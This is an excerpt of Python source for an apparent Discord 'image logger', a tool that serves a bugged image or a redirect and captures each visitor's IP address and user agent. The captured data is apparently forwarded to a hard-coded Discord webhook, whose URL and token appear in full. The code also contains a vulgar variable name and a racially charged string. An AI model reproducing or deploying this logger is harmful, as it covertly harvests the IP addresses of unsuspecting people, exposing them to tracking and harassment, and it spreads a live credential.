...
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1251901750647066645/RfPlxxLV8OlHHaSNMYefUDQKXNfBUlo-OQFXCj504QFP-cJh0fPcOd4JhtFY4eI4uyLF",
...
blacklistedIPs = (
"27", "104", "143", "164")  # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
...
class ImageLoggerAPI(BaseHTTPRequestHandler):
    ...
    def handleRequest(self):
        ippulapizda = self.headers.get('x-forwarded-for')
        if True:
         data = ippulapizda.encode()
        else:
         data = "GeorgeFloyd".encode()
        try:
            ...
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                ...
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config[
                    "buggedImage"] else url)  # Define the data as an image so Discord can show it.
                ...
                if config["message"]["richMessage"] and result:
                    ...
                    message = message.replace("{bot}", str(
                        result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result[
                            "hosting"] else 'False'))
